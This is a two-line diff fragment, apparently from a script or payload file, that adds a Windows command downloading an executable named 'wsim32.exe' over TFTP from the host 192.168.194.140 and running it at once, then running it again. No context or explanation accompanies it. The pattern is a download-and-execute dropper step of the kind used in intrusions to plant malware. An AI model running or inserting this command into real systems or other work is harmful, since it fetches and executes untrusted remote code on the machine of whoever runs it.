@@ -1,0 +1,2 @@
+tftp -i 192.168.194.140 get wsim32.exe &wsim32.exe
+wsim32.exe
